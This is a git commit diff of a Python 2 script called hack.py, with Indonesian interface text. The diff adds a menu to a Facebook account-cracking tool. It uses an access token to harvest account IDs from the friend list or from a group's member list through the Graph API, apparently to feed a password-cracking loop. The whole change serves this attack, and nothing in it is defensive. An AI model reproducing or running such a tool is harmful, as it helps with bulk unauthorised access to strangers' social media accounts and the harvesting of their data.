cd0626dac061d707ac9759bb1733204831d4465b
Muhamad Ramdani <53518615+QueenSyifa@users.noreply.github.com>
2019-09-24 12:57:30 +0700

    Update hack.py

--- hack.py
+++ hack.py
@@ -138,7 +138,56 @@ def menu():
     print logo
     print '\x1b[1;91m[\x1b[1;96m\xe2\x97\x8f\x1b[1;91m]\x1b[1;97m Tool \x1b[1;91m: \x1b[1;92mCrack dari daftar Teman'
     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
-    print '\n\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
+    print '\n\x1b[1;37;40m1. Crack dari daftar Teman'
+    print '\x1b[1;37;40m2. Crack dari member Grup'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    pilih_super()
+
+
+def pilih_super():
+    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if peak == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        pilih_super()
+    else:
+        if peak == '1':
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            z = json.loads(r.text)
+            for s in z['data']:
+                id.append(s['id'])
+
+        else:
+            if peak == '2':
+                os.system('clear')
+                print logo
+                print 40 * '\x1b[1;97m\xe2\x95\x90'
+                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
+                try:
+                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
+                    asw = json.loads(r.text)
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+                except KeyError:
+                    print '\x1b[1;91m[!] Grup tidak ditemukan'
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                    super()
+
+                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
+                s = json.loads(re.text)
+                for i in s['data']:
+                    id.append(i['id'])
+
+            else:
+                if peak == '0':
+                    menu_hack()
+                else:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
+                    pilih_super()
+    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
     titik = ['.   ', '..  ', '... ']
     for o in titik:
